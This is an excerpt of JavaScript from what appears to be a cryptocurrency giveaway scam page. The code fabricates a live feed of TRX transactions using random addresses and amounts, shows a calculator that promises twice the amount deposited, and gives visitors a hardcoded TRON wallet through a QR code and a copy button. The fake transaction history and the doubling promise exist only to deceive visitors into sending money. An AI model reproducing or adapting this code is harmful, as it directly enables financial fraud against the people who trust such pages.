...
function create_transaction(mins) {
  var table,
    ...
    address = get_random(),
    amount = (amount = (400e3 * Math.random()).toFixed(2)),
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">THR4k8YiK1fm24JABoWM2g63DdtH3eKBw1</span> </td> <td>' +
    amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
    ' TRX</td> <td><span class="small text-secondary">0<b>.</b>000' +
    tx(999) +
    "</span></td> </tr>";
  var table,
    row = (table = document.getElementById('myTable')).insertRow(1),
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">THR4k8YiK1fm24JABoWM2g63DdtH3eKBw1</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    "</a> </td> <td>" +
    send_amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
    ' TRX</td> <td><span class="small text-secondary">0<b>.</b>000' +
    tx(999) +
    "</span></td> </tr>";
}
...
function new_transaction() {
  var table,
    ...
    address = get_random(),
    amount = (400e3 * Math.random()).toFixed(2),
    decimal = String(Math.random(1, 999))
  ;(row.innerHTML =
    '<tr> <td><a class="hash-tag text-truncate" href="">0x' +
    generateId(63) +
    ...
    setTimeout(() => {
      ...
      (row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">THR4k8YiK1fm24JABoWM2g63DdtH3eKBw1</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        "</a> </td> <td>" +
        send_amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
        ' TRX</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 15000 && $('#cal-in').val() <= 1500000) {
      ...
      $("#qrcode_svg").attr(
        "src",
        "https://api.qrserver.com/v1/create-qr-code/?data=THR4k8YiK1fm24JABoWM2g63DdtH3eKBw1&size=150x150"
      );
      // $('#paynow')
      //   .parent()
      //   .attr(
      //     'href',
      //     'tron:TLcQnEdxF6H2RUWziN3fsTgCHwLnraLXdT?amount=' +
      //       amount_entered +
  ...
  $('#cal-in').on('input', () => {
    ...
    if (in_amount >= 15000 && in_amount < 50000) {
      $('#cal-out').val(in_amount * 2)
    } else if ((in_amount) >= 50000 && in_amount <= 1500000) {
...
$('#cal-out').on('input', () => {
  ...
  if (in_amount >= 30000 && in_amount < 150000) {
    $('#cal-in').val(in_amount / 2)
  } else if (in_amount <= 150000 && in_amount <= 4500000) {
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'THR4k8YiK1fm24JABoWM2g63DdtH3eKBw1',
  )
